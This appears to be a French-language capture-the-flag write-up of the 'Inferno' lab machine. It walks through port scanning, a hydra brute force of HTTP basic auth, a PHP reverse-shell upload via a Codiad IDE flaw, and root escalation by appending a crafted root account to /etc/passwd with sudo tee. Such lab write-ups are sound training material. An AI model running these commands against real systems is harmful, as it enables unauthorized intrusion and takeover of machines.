# ROOM : Inferno
Une room medium, on va test ca :)

# Infos
Un collègue la fait, donc je vais la faire aussi pour le fun ! :D

# Enumeration
## NMAP
```
PORT      STATE SERVICE           VERSION
21/tcp    open  ftp?
22/tcp    open  ssh               OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA)
|   256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA)
|_  256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519)
23/tcp    open  telnet?
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http              Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Dante's Inferno
88/tcp    open  kerberos-sec?
106/tcp   open  pop3pw?
110/tcp   open  pop3?
194/tcp   open  irc?
|_irc-info: Unable to open connection
389/tcp   open  ldap?
464/tcp   open  kpasswd5?
636/tcp   open  ldapssl?
750/tcp   open  kerberos?
775/tcp   open  entomb?
777/tcp   open  multiling-http?
779/tcp   open  unknown
783/tcp   open  spamassassin?
808/tcp   open  ccproxy-http?
873/tcp   open  rsync?
1001/tcp  open  webpush?
1178/tcp  open  skkserv?
1210/tcp  open  eoss?
1236/tcp  open  bvcontrol?
1300/tcp  open  h323hostcallsc?
1313/tcp  open  bmc_patroldb?
1314/tcp  open  pdps?
1529/tcp  open  support?
2000/tcp  open  cisco-sccp?
2003/tcp  open  finger?
2121/tcp  open  ccproxy-ftp?
2150/tcp  open  dynamic3d?
2600/tcp  open  zebrasrv?
2601/tcp  open  zebra?
2602/tcp  open  ripd?
2603/tcp  open  ripngd?
2604/tcp  open  ospfd?
2605/tcp  open  bgpd?
2606/tcp  open  netmon?
2607/tcp  open  connection?
2608/tcp  open  wag-service?
2988/tcp  open  hippad?
2989/tcp  open  zarkov?
4224/tcp  open  xtell?
4557/tcp  open  fax?
4559/tcp  open  hylafax?
4600/tcp  open  piranha1?
4949/tcp  open  munin?
5051/tcp  open  ida-agent?
5052/tcp  open  ita-manager?
5151/tcp  open  esri_sde?
5354/tcp  open  mdnsresponder?
5355/tcp  open  llmnr?
5432/tcp  open  postgresql?
5555/tcp  open  freeciv?
5666/tcp  open  nrpe?
5667/tcp  open  unknown
5674/tcp  open  hyperscsi-port?
5675/tcp  open  v5ua?
5680/tcp  open  canna?
6346/tcp  open  gnutella?
6514/tcp  open  syslog-tls?
6566/tcp  open  sane-port?
6667/tcp  open  irc?
|_irc-info: Unable to open connection
8021/tcp  open  ftp-proxy?
8081/tcp  open  blackice-icecap?
8088/tcp  open  radan-http?
8990/tcp  open  http-wmap?
9098/tcp  open  unknown
9359/tcp  open  unknown
9418/tcp  open  git?
9673/tcp  open  unknown
10000/tcp open  snet-sensor-mgmt?
10081/tcp open  famdc?
10082/tcp open  amandaidx?
10083/tcp open  amidxtape?
11201/tcp open  smsqp?
15345/tcp open  xpilot?
17001/tcp open  unknown
17002/tcp open  unknown
17003/tcp open  unknown
17004/tcp open  unknown
20011/tcp open  unknown
20012/tcp open  ss-idi-disc?
24554/tcp open  binkp?
27374/tcp open  subseven?
30865/tcp open  unknown
57000/tcp open  unknown
60177/tcp open  unknown
60179/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Toujours plus mdr !
## GOBUSTER
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://inferno.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/inferno              (Status: 401) [Size: 458]
/server-status        (Status: 403) [Size: 276]
```
La page **/inferno** demande un identifiant/mot de passe.

# Exploitation
Je ne connais pas l'identifiant. Mais le nom du site est **Dante's inferno** je test donc avec l'utilisateur **Dante** mais cela ne fonctionne pas. Je test donc avec **admin**...
```
hydra -l admin -P /home/kali/Wordlist/rockyou.txt "http-get://inferno.thm/inferno:F=401 username=^USER^&password=^PASS^:A=BASIC:" -V -I
```
Il me trouve un mot de passe :
```
[80][http-get] host: inferno.thm   login: admin   password: d[...]1
```
De nouveau une page avec un login mdp, je remet le même, ca m'ouvre une nouvelle page avec Codiad (Un IDE en cloud).

Il existe une RCE sur cet IDE, voici les étapes à suivre pour l'exploiter :

1) Log sur Codiad
2) Suivre ce chemin dans le panel sur la gauche : **themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF**
3) Click droit puis **Upload file**
4) Upload le shell.php
5) Fait click droit sur le shell puis **Delete** afin d'avoir le full path : **/var/www/html/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/php-revshell.php**
6) Plus qu'a request l'url avec le shell : **curl -k http://inferno.thm/inferno/themes/default/filemanager/images/codiad/manifest/files/codiad/example/INF/php-revshell.php -u "admin:dante1"**

Nous voici avec un shell :
```
listening on [any] 4444 ...
connect to [10.11.50.195] from (UNKNOWN) [10.10.237.225] 57034
Linux Inferno 4.15.0-130-generic #134-Ubuntu SMP Tue Jan 5 20:46:26 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 08:28:09 up 56 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```
# Post-Exploitation
En farfouillant, je trouve un script présent dans **/var/www/html/machine_services1320.sh** qui tue le processus **bash** et execute plein de commande **nc** avec plein de ports différents afin de brouiller les pistes, ce qui explique les X ports scanner par nmap. :)
```machine_services1320.sh
pkill bash &
nc -nvlp 21 &
nc -nvlp 23 &
nc -nvlp 25 &
nc -nvlp 110 &
nc -nvlp 88 &
nc -nvlp 53 &
nc -nvlp 194 &
[...]
```
On va check le home de notre user:
```
$ ls -la /home/dante/*
-rw------- 1 dante dante   33 Jan 11  2021 /home/dante/local.txt

/home/dante/Desktop:
total 240
drwxr-xr-x  2 root  root    4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante   4096 Jan 11  2021 ..
-rwxr-xr-x  1 root  root   63704 Jan 11  2021 inferno.txt
-rwxr-xr-x  1 root  root   30904 Jan 11  2021 paradiso.txt
-rwxr-xr-x  1 root  root  137440 Jan 11  2021 purgatorio.txt

/home/dante/Documents:
total 464
drwxr-xr-x  2 root  root    4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante   4096 Jan 11  2021 ..
-rwxr-xr-x  1 root  root   35312 Jan 11  2021 beatrice.doc
-rwxr-xr-x  1 root  root   63704 Jan 11  2021 caronte.doc
-rwxr-xr-x  1 root  root  133792 Jan 11  2021 centauro.doc
-rwxr-xr-x  1 root  root   88280 Jan 11  2021 cerbero.doc
-rwxr-xr-x  1 root  root  137440 Jan 11  2021 virgilio.doc

/home/dante/Downloads:
total 4420
drwxr-xr-x  2 root  root     4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante    4096 Jan 11  2021 ..
-rw-r--r--  1 root  root     1511 Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoII.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoIV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoIX.docx
-rwxr-xr-x  1 root  root    43224 Jan 11  2021 CantoV.docx
-rwxr-xr-x  1 root  root   133792 Jan 11  2021 CantoVI.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoVII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoX.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXI.docx
-rwxr-xr-x  1 root  root   149080 Jan 11  2021 CantoXII.docx
-rwxr-xr-x  1 root  root   216256 Jan 11  2021 CantoXIII.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIV.docx
-rwxr-xr-x  1 root  root   141528 Jan 11  2021 CantoXIX.docx
-rwxr-xr-x  1 root  root    88280 Jan 11  2021 CantoXV.docx
-rwxr-xr-x  1 root  root   137440 Jan 11  2021 CantoXVI.docx
-rwxr-xr-x  1 root  root   121432 Jan 11  2021 CantoXVII.docx
-rwxr-xr-x  1 root  root  2351792 Jan 11  2021 CantoXVIII.docx
-rwxr-xr-x  1 root  root    63704 Jan 11  2021 CantoXX.docx

/home/dante/Music:
total 8
drwxr-xr-x  2 root  root  4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante 4096 Jan 11  2021 ..

/home/dante/Pictures:
total 8
drwxr-xr-x  2 root  root  4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante 4096 Jan 11  2021 ..
-rw-r--r--  1 root  root     0 Jan 11  2021 1.jpg
-rw-r--r--  1 root  root     0 Jan 11  2021 2.jpg
-rw-r--r--  1 root  root     0 Jan 11  2021 3.jpg
-rw-r--r--  1 root  root     0 Jan 11  2021 4.jpg
-rw-r--r--  1 root  root     0 Jan 11  2021 5.jpg
-rw-r--r--  1 root  root     0 Jan 11  2021 6.jpg

/home/dante/Public:
total 8
drwxr-xr-x  2 root  root  4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante 4096 Jan 11  2021 ..

/home/dante/Templates:
total 8
drwxr-xr-x  2 root  root  4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante 4096 Jan 11  2021 ..

/home/dante/Videos:
total 8
drwxr-xr-x  2 root  root  4096 Jan 11  2021 .
drwxr-xr-x 13 dante dante 4096 Jan 11  2021 ..
```
Plein de trucs... Et tout est executable ???????????
```
$ file beatrice.doc
beatrice.doc: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=38576c0e3b86a3a81e8c63ddfceb776686f5d909, stripped
```
Ce sont en faite des binaires linux.

J'en execute un pour test et il m'affiche un message d'erreur et propose **--help** je vais donc tous les test voir ce qu'il font.

Le dossier **Downloads**:
```
CantoI.docx = mv
CantoII.docx = cp
CantoIII.docx = touch
CantoIV.docx = rm
CantoIX.docx = ls
CantoV.docx = id
CantoVI.docx = ls
CantoVII.docx = cp
CantoX.docx = rm
CantoXI.docx = ./CantoXI.docx: 0: Illegal option --
CantoXII.docx = CantoXII.docx: ./CantoXII.docx must be owned by uid 0 and have the setuid bit set
CantoXIII.docx = zip
CantoXIV.docx = /bin/sh: 98: ../: Permission denied
CantoXIX.docx = cp
CantoXV.docx = touch
CantoXVI.docx = mv
CantoXVII.docx = ./CantoXVII.docx: 0: Illegal option --
CantoXVIII.docx = git
CantoXX.docx = rm
```
Le dossier **Desktop**:
```
inferno.txt = rm
paradiso.txt = id
purgatorio.txt = mv
```
Le dossier **Documents**:
```
beatrice.doc = nc
caronte.doc = rm
centauro.doc = ls
cerbero.doc = touch
virgilio.doc = mv
```
Dans **Pictures**, ce sont des fichiers vides.

Je constate donc qu'il s'agit de binaire linux renommée, **inferno.txt** par exemple vaux la commande **rm** sur linux.
Certains sont inconnu. :)

Le fichier **.download.dat** contient de l'hexa
```
c2 ab 4f 72 20 73 65 ac 20 6c 61 72e 0a67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 [...]
```
Une fois déchiffrer:
```
Â«Or seâ tu quel Virgilio e quella fonte
che spandi di parlar sÃ¬ largo fiume?Â»,
rispuosâio lui con vergognosa fronte.

Â«O de li altri poeti onore e lume,
vagliami âl lungo studio e âl grande amore
che mâha fatto cercar lo tuo volume.

Tu seâ lo mio maestro e âl mio autore,
tu seâ solo colui da cuâ io tolsi
lo bello stilo che mâha fatto onore.

Vedi la bestia per cuâ io mi volsi;
aiutami da lei, famoso saggio,
châella mi fa tremar le vene e i polsiÂ».

dante:V[...]3
```
Il contient visiblement le compte de dante.

Pour passer sur le compte de **dante** on doit avoir un **bash**.. Donc on ce fait souvent repasser sur le compte **www-data**... C'est donc un peu une course contre la montre !
Avec le compte de **dante** je test un accès SSH pour avoir un accès stable. 

Mais cela ne fonctionne pas, ca me logout à chaque fois... On va devoir faire avec je pense.

## Prives to root
Me voici en tant que **dante**
```
dante@Inferno:~$ sudo -l
sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```
On va essayer de se créer notre propre compte root avec **tee**.

Pour cela, il faut généré un hashe de mot de passe:
```
openssl passwd -1 -salt "theroot" "test" 
$1$theroot$Gk20pB8iVcF4tFVEsu1mu1
```
On va maintenant créer mon user en écrivant dans le fichier **/etc/passwd** grace a **tee**
```
echo 'theroot:$1$theroot$Gk20pB8iVcF4tFVEsu1mu1:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
```
puis on se log sur notre nouvelle session root:
```
dante@Inferno:~$ su - theroot
Password: 
root@Inferno:~#
```
Une fois root, plus de problème de stabilité !
